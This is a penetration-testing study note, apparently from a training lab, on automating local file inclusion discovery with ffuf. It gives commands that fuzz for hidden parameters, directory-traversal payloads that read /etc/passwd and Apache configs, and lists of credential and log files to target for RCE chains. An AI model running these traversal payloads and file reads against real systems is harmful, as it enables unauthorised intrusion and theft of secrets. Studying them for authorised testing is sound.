# File Inclusion – Automated Scanning

## Overview

Manual LFI testing is still the most reliable approach, especially when:

- filters are custom
- wrappers behave differently
- WAFs block specific characters
- path handling is unusual
- exploitation needs a tailored payload

That said, automation is extremely useful for:

- quickly identifying hidden parameters
- testing large LFI payload sets
- discovering webroots
- finding log/config files
- gathering targets for manual follow-up

Think of automation as a metal detector. It helps you find where to dig, but you still need to dig by hand.

---

# 1. Fuzzing Parameters

Many vulnerable parameters are **not exposed in forms**. They may exist only in:

- hidden links
- internal redirects
- legacy code
- API handlers
- debug functionality
- template includes

These “forgotten” parameters are often weaker than public-facing ones.

## Fuzzing for GET parameters with `ffuf`

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
-fs 2287
```

## What this does

- uses a wordlist of common parameter names
- injects each name into `?FUZZ=value`
- filters responses by size with `-fs 2287`
- helps identify parameters that change application behavior

## Example result

```text
language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

If a parameter like `language` appears and was not obvious in the UI, it becomes a strong target for:

- LFI
- SSRF
- SQLi
- command injection
- access control issues

## Tip

If you want a more focused LFI scan, use a smaller parameter list biased toward include/load/file/page-style names.

Common LFI-style parameter names include:

- `file`
- `page`
- `include`
- `lang`
- `language`
- `template`
- `view`
- `doc`
- `folder`
- `path`

---

# 2. LFI Wordlists

Instead of hand-crafting every payload, we can use known LFI payload collections.

A strong choice is:

```text
/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

This includes:

- basic traversal payloads
- encoding variants
- filter bypasses
- common target files

## Fuzzing a known parameter for LFI

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
-fs 2287
```

## Example results

```text
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

These results suggest the parameter is vulnerable and multiple traversal styles work.

## Best practice after fuzzing

Do not stop at the `ffuf` hit. Always manually verify the winning payloads.

For example:

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd'
```

You want to confirm:

- the file content is actually returned
- it is not a false positive
- the payload works consistently
- the result is exploitable, not just different-sized noise

---

# 3. Fuzzing for Useful Server Files

Beyond `/etc/passwd`, there are files that directly help exploitation, including:

- webroot indicators
- Apache/Nginx configs
- PHP configs
- environment files
- logs
- framework configs
- SSH keys
- application secrets

Useful targets fall into three big groups:

1. **webroot discovery**
2. **log discovery**
3. **configuration discovery**

---

# 4. Fuzzing for the Server Webroot

Sometimes you need the absolute webroot path to:

- locate uploaded files
- write a shell to disk
- resolve a wrapper or include path
- understand where the application lives

A common trick is to fuzz for `index.php` under common default webroot locations.

## Linux webroot fuzzing example

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
-fs 2287
```

## Example result

```text
/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

This strongly suggests the application webroot is:

```text
/var/www/html/
```

## Why append `index.php`?

Because we are probing for a file that likely exists under a valid webroot.

This is often more reliable than just probing the directory alone.

## Common Linux webroots

```text
/var/www/html/
/srv/www/htdocs/
/usr/local/apache2/htdocs/
/var/www/
/opt/lampp/htdocs/
```

## Common Windows webroots

```text
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp\www\
C:\Apache24\htdocs\
```

---

# 5. Fuzzing for Logs and Config Files

Logs and configs are high-value because they often reveal:

- absolute paths
- credentials
- log locations
- service users
- runtime options
- enabled modules
- virtual hosts
- upload directories

## Example Linux config/log fuzzing

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' \
-fs 2287
```

## Example results

```text
/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

---

# 6. Using Config Files to Pivot Further

Fuzzing gives you candidate files. Reading them manually gives you leverage.

## Read Apache config

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf'
```

## Example useful output

```apache
ServerAdmin webmaster@localhost
DocumentRoot /var/www/html

ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
```

This reveals:

- the webroot: `/var/www/html`
- log files exist under `${APACHE_LOG_DIR}`

Now read `envvars`:

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars'
```

## Example useful output

```bash
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

Now you know:

- Apache runs as `www-data`
- logs are under `/var/log/apache2`
- access log is likely `/var/log/apache2/access.log`
- error log is likely `/var/log/apache2/error.log`

This is exactly the kind of pivot point that turns simple file disclosure into:

- log poisoning
- upload-to-RCE
- config abuse
- credential theft

---

# 7. Typical Automation Workflow

A practical order of operations is:

## Step 1 – Find suspicious parameters
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
-fs 2287
```

## Step 2 – Fuzz the candidate parameter with LFI payloads
```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
-fs 2287
```

## Step 3 – Manually validate working payloads
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd'
```

## Step 4 – Fuzz for webroots
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
-fs 2287
```

## Step 5 – Fuzz for configs/logs
```bash
ffuf -w ./LFI-WordList-Linux:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' \
-fs 2287
```

## Step 6 – Read the most useful files manually
Focus on:

- Apache/Nginx config
- PHP config
- env files
- logs
- app config
- framework secrets

---

# 8. Useful Files to Target After Discovery

## Core Linux files
```text
/etc/passwd
/etc/hosts
/etc/hostname
/etc/issue
/etc/fstab
/etc/login.defs
```

## Apache
```text
/etc/apache2/apache2.conf
/etc/apache2/envvars
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
```

## Nginx
```text
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/var/log/nginx/access.log
/var/log/nginx/error.log
```

## PHP
```text
/etc/php/7.4/apache2/php.ini
/etc/php/8.1/apache2/php.ini
/etc/php/7.4/fpm/php.ini
```

## Application files
```text
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
```

## Windows examples
```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
```

---

# 9. Why Automation Matters

Automation is good at breadth.

Manual testing is good at depth.

## Automation helps with:
- fast reconnaissance
- coverage
- payload variety
- identifying obvious wins
- reducing repetitive work

## Manual work helps with:
- bypassing custom filters
- validating real impact
- chaining to RCE
- understanding path logic
- handling app-specific behavior
- adapting around WAF/encoding problems

In real testing, you usually need both.

---

# 10. Common `ffuf` Tuning Notes

## Filter by size
```bash
-fs 2287
```
Useful when the app always returns a baseline response and vulnerable responses are larger or smaller.

## Filter by words
```bash
-fw 690
```

## Filter by lines
```bash
-fl 64
```

## Match specific status codes
```bash
-mc 200,204,301,302,307,401,403,405
```

For LFI work, do not restrict too tightly to only `200`, because readable files may still surface through:

- redirects
- forbidden pages
- odd status behavior
- framework error pages

---

# 11. LFI Tools

There are purpose-built LFI tools that try to automate discovery and exploitation.

Common examples:

- `LFISuite`
- `LFiFreak`
- `liffy`

These can help, but they have limitations.

## Downsides
- many are old
- many depend on Python 2
- some are noisy
- some miss non-standard cases
- some assume trivial filters
- some generate false positives

Treat them like junior assistants: helpful for speed, but do not trust them blindly.

---

# 12. Practical Notes

## When automation is most effective
- obvious traversal flaws
- no WAF
- standard Linux/Apache/PHP layout
- common parameter names
- direct inclusion behavior

## When manual work becomes essential
- path prefixes are appended
- extensions are appended
- regex filtering exists
- double encoding is needed
- null-byte/path truncation legacy cases
- wrapper behavior matters
- RCE chain depends on environment-specific paths

---

# 13. Quick Commands

## Fuzz GET parameters
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
-fs 2287
```

## Fuzz LFI payloads
```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
-fs 2287
```

## Fuzz Linux webroot
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
-fs 2287
```

## Fuzz Linux config/log files
```bash
ffuf -w ./LFI-WordList-Linux:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' \
-fs 2287
```

## Manually read Apache config
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf'
```

## Manually read Apache envvars
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars'
```

## Manually verify `/etc/passwd`
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd'
```

---

# 14. Key Takeaways

- fuzzing parameters often reveals hidden include-style inputs
- `LFI-Jhaddix.txt` is strong for broad first-pass payload testing
- webroot discovery becomes important for uploads and RCE chains
- config files often reveal both webroot and log paths
- automation finds leads; manual analysis turns them into exploitation
- logs, configs, and environment files are often more valuable than `/etc/passwd`

---

# Tags

#file-inclusion
#lfi
#ffuf
#fuzzing
#webroot
#apache
#nginx
#php
#automation
#recon
#tools
#obsidian